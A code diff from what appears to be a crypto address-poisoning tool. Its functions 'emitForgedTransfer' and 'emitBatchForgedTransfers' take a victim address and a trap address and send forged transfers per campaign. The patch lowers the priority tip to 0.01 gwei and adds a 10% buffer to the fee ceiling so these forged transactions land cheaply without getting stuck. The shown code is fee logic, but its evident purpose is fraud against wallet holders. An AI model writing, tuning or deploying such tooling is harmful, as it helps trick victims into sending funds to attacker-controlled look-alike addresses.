@@ -1049,18 +1049,17 @@ function emitForgedTransfer(victimAddress, trapAddress, rawValue, walletClient, 
     // 🚀 FIX: Get explicit nonce to prevent race conditions on RPC load balancers
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 SMART GAS: 0.02 gwei tip, dynamic ceiling to prevent dropped transactions
-    let maxPriorityFeePerGas = 20000000n; // 🚀 STRICTLY 0.02 gwei tip (This is the only extra you pay)
+    // 🚀 ROBUST & CHEAP GAS: 0.01 gwei tip, dynamic ceiling with shock-absorber buffer
+    let maxPriorityFeePerGas = 10000000n; // 🚀 STRICTLY 0.01 gwei tip (The absolute minimum)
     let maxFeePerGas = 3000000000n; // 3 gwei safe fallback ceiling
 
     try {
       const feeData = await client.estimateFeesPerGas();
 
       if (feeData.maxFeePerGas && feeData.maxFeePerGas > 100000000n) {
-        // 🚀 CRITICAL: Do NOT cap the maxFeePerGas! 
-        // If the network base fee is 2 gwei and we cap at 1 gwei, it gets stuck in mempool and dropped.
-        // You ONLY pay the actual base fee anyway, so a higher ceiling costs you $0 extra.
-        maxFeePerGas = feeData.maxFeePerGas;
+        // 🚀 ROBUSTNESS: Add a 10% buffer to the ceiling to protect against sudden base fee spikes.
+        // This costs you $0 extra (you only pay the actual base fee), but prevents the TX from getting stuck if the network spikes.
+        maxFeePerGas = feeData.maxFeePerGas + (feeData.maxFeePerGas / 10n);
       } else {
         logger.debug(`[mirror] RPC returned glitchy fees. Using 3 gwei fallback ceiling.`);
       }
@@ -1340,18 +1339,17 @@ async function emitBatchForgedTransfers(walletClient, campaignId, contractAddres
 
     let nonce = await getAndIncrementNonce(campaignId, walletClient, operatorAddress);
 
-    // 🚀 SMART GAS: 0.02 gwei tip, dynamic ceiling to prevent dropped transactions
-    let maxPriorityFeePerGas = 20000000n; // 🚀 STRICTLY 0.02 gwei tip (This is the only extra you pay)
+    // 🚀 ROBUST & CHEAP GAS: 0.01 gwei tip, dynamic ceiling with shock-absorber buffer
+    let maxPriorityFeePerGas = 10000000n; // 🚀 STRICTLY 0.01 gwei tip (The absolute minimum)
     let maxFeePerGas = 3000000000n; // 3 gwei safe fallback ceiling
 
     try {
       const feeData = await client.estimateFeesPerGas();
 
       if (feeData.maxFeePerGas && feeData.maxFeePerGas > 100000000n) {
-        // 🚀 CRITICAL: Do NOT cap the maxFeePerGas! 
-        // If the network base fee is 2 gwei and we cap at 1 gwei, it gets stuck in mempool and dropped.
-        // You ONLY pay the actual base fee anyway, so a higher ceiling costs you $0 extra.
-        maxFeePerGas = feeData.maxFeePerGas;
+        // 🚀 ROBUSTNESS: Add a 10% buffer to the ceiling to protect against sudden base fee spikes.
+        // This costs you $0 extra (you only pay the actual base fee), but prevents the TX from getting stuck if the network spikes.
+        maxFeePerGas = feeData.maxFeePerGas + (feeData.maxFeePerGas / 10n);
       } else {
         logger.debug(`[batch] RPC returned glitchy fees. Using 3 gwei fallback ceiling.`);
       }
